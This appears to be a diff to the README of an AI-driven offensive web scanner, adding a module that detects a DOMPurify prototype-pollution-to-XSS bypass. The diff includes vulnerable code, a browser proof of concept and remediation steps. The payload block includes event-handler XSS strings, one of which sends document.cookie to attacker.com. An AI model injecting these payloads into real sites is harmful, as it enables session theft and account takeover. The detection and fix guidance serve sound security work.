@@ -1759,6 +1759,200 @@ npm audit fix --force
 
 ---
 
+### DOMPurify Prototype Pollution → XSS Bypass — DOMPurifyPPBypass (v2.1)
+
+> **Research basis:**
+> trace37 labs — offensive security research
+> "CVE-2026-41238: How Prototype Pollution Turns DOMPurify Into an XSS Gadget"
+> https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/
+> GitHub Advisory: GHSA-v9jr-rg53-9pgp
+> **CVE:** CVE-2026-41238 | **Affected:** DOMPurify 3.0.1–3.3.3 | **Fixed:** DOMPurify 3.4.0
+> **CWE:** CWE-79 (XSS) + CWE-1321 (Prototype Pollution)
+> **Skill module:** `DOMPurifyPPBypass` (id: 57)
+
+---
+
+#### Background
+
+DOMPurify is the most widely deployed client-side HTML sanitizer in the world — trusted by millions
+of web applications to prevent Cross-Site Scripting. Despite being specifically designed to prevent
+XSS, a subtle architectural flaw in versions 3.0.1–3.3.3 allows an attacker who can trigger
+**Prototype Pollution** elsewhere in the application to **completely neutralize DOMPurify's sanitization**.
+
+The attack is a two-step chain:
+
+**Step 1 — Prototype Pollution Primitive**
+
+The attacker uses a PP gadget already present in the application to inject `RegExp` objects into
+`Object.prototype`. Common PP sources:
+
+| Library | Vulnerable range | CVE |
+|---------|-----------------|-----|
+| lodash  | < 4.17.21 | CVE-2021-23337 |
+| jQuery  | < 3.4.0   | CVE-2019-11358 |
+| qs      | < 6.7.3   | CVE-2022-24999 |
+| minimist | < 1.2.6  | CVE-2021-44906 |
+| hoek    | < 6.1.3   | CVE-2018-3728  |
+
+> **Critical nuance:** Most URL/JSON PP vectors produce _strings_ on `Object.prototype`.
+> This bypass requires actual **`RegExp` object** injection (type-preserving merge).
+> Vectors: JavaScript `postMessage` handlers with deep-merge, server-side jsdom + vulnerable merge.
+
+**Step 2 — DOMPurify CUSTOM_ELEMENT_HANDLING Fallback**
+
+In vulnerable DOMPurify, when no configuration is supplied, the default fallback is:
+
+```js
+// DOMPurify internals (3.0.1–3.3.3)
+CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
+//                                                      ^^
+// {} inherits from Object.prototype — pollution flows in!
+```
+
+If `Object.prototype.tagNameCheck` has been set to `/.*/`, then:
+
+```js
+if (CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
+    regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, lcTagName)) {
+    return true;  // ← ALL custom element tags allowed
+}
+```
+
+Every subsequent `DOMPurify.sanitize()` call passes XSS payloads through unchanged.
+
+#### Attack Payloads (after PP)
+
+```html
+<x-foo onclick=alert(document.domain)>click me</x-foo>
+<custom-element onmouseover=alert(1)>hover</custom-element>
+<a-b onfocus=alert(1) autofocus>focus me</a-b>
+<x-y onload=fetch('https://attacker.com?c='+document.cookie)>
+```
+
+Any **hyphenated element name** (HTML custom element) + **any event handler** = XSS after PP.
+
+#### Detection Categories
+
+**1. DOMPurify Version Fingerprinting (`VERIFIED`)**
+
+Extracts version from JS bundles, package.json, CDN paths:
+```
+DOMPurify.version = "3.1.2"        → VULNERABLE (3.0.1–3.3.3)
+/*! DOMPurify 3.4.0               → PATCHED
+"dompurify": "3.2.0"              → VULNERABLE
+```
+
+**2. Prototype Pollution Gadget Detection (`VERIFIED`)**
+
+Fingerprints vulnerable library versions in bundles and package.json:
+```
+lodash/3.10.1       → PP gadget (_.merge) — CVE-2021-23337
+jquery/3.3.1        → PP gadget ($.extend) — CVE-2019-11358
+qs@6.5.0            → PP gadget (allowPrototypes) — CVE-2022-24999
+```
+
+**3. CUSTOM_ELEMENT_HANDLING Default Config Usage (`LIKELY`)**
+
+Detects `DOMPurify.sanitize(input)` without explicit configuration object.
+
+**4. Combined Chain Scoring (`LIKELY → CRITICAL`)**
+
+When both conditions are met simultaneously:
+```
+DOMPurify 3.0.1–3.3.3  +  PP gadget present  →  CRITICAL
+```
+
+**5. postMessage + Deep-Merge Detection (`INFERRED`)**
+
+```js
+window.addEventListener('message', (e) => {
+    Object.assign(config, JSON.parse(e.data));  // type-preserving PP vector
+});
+```
+
+#### AI Auto-Trigger Logic
+
+```
+all web targets (http/https)
+  └─ JS bundle analysis (always runs — fast, low overhead)
+       ├─ DOMPurify detected?
+       │    ├─ version 3.0.1–3.3.3 → VULNERABLE (log VERIFIED)
+       │    ├─ version ≥ 3.4.0 → PATCHED (log VERIFIED)
+       │    └─ unknown version → continue scanning
+       ├─ PP gadget libraries detected?
+       │    └─ log per-library version + CVE
+       ├─ Both DOMPurify vuln + PP gadget?
+       │    └─ emit CRITICAL combined_chain finding
+       ├─ postMessage + merge pattern?
+       │    └─ emit INFERRED postmessage_pp finding
+       └─ package.json exposed?
+            └─ emit VERIFIED package_json_exposed finding
+```
+
+#### Browser Console PoC (for Burp Validation)
+
+```js
+// Step 1: Pollute Object.prototype with RegExp (simulating PP gadget)
+Object.prototype.tagNameCheck = /.*/;
+Object.prototype.attributeNameCheck = /.*/;
+
+// Step 2: Test DOMPurify sanitization bypass
+const payload = '<x-foo onclick=alert(document.domain)>XSS</x-foo>';
+const clean = DOMPurify.sanitize(payload);
+
+// VULNERABLE:  clean === '<x-foo onclick=alert(document.domain)>XSS</x-foo>'
+// PATCHED:     clean === '<x-foo>XSS</x-foo>'  (onclick removed)
+
+console.log(clean.includes('onclick') ? '🚨 BYPASS CONFIRMED' : '✅ PATCHED');
+```
+
+#### Output Example
+
+```
+🔬 AI decision: DOMPurify PP→XSS bypass scan activated (CVE-2026-41238)
+📦 DOMPurify 3.2.1 detected [VERIFIED] — VULNERABLE (CVE-2026-41238) (found at: /static/js/main.js)
+🚨 DOMPurify 3.2.1 in VULNERABLE range! CVE-2026-41238: Prototype Pollution → XSS bypass
+⚡ PP gadget found: lodash 3.10.1 — lodash < 4.17.21 (_.merge PP, CVE-2021-23337) [VERIFIED]
+💥 CVE-2026-41238 full attack chain! DOMPurify 3.2.1 + PP gadget [lodash@3.10.1] CRITICAL [LIKELY]
+📄 package.json exposed — dependency info publicly accessible [VERIFIED]
+
+DOMPurifyPPBypass scan done: 4 findings | DP_ver:3.2.1 | vuln:True | PP_gadgets:1 | sev:critical
+```
+
+#### Evidence Levels
+
+| Finding | Evidence Level | Reason |
+|---------|---------------|--------|
+| DOMPurify version from JS bundle | `VERIFIED` | Direct extraction from source |
+| PP gadget library version | `VERIFIED` | Version string from bundle/package.json |
+| Default config usage pattern | `LIKELY` | Code pattern match |
+| Combined chain (DP vuln + PP gadget) | `LIKELY` | Both conditions verified, chain needs real PP trigger |
+| postMessage + merge pattern | `INFERRED` | Pattern match; PP type preservation unverified |
+
+#### Quick Remediation
+
+```bash
+# 1. Upgrade DOMPurify immediately
+npm install dompurify@latest   # ≥ 3.4.0
+
+# 2. Patch PP gadget libraries
+npm install lodash@4.17.21 jquery@3.4.0 qs@6.7.3
+
+# 3. Always specify CUSTOM_ELEMENT_HANDLING explicitly
+DOMPurify.sanitize(html, {
+  CUSTOM_ELEMENT_HANDLING: {
+    tagNameCheck: /^(b|i|u|em|strong)$/,  // allowlist only
+    attributeNameCheck: /^(class|id)$/,
+    allowCustomizedBuiltInElements: false
+  }
+});
+
+# 4. Freeze Object.prototype in production
+Object.freeze(Object.prototype);  // prevents all PP
+```
+
+---
+
 ### CSPT + Cloudflare WAF Bypass + Multi-ContentType Fuzzing — CSPTWafBypass (v2.1)
 
 > **Research basis:**  
@@ -1970,7 +2164,7 @@ triggers = {
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **56 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56)
+- **57 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
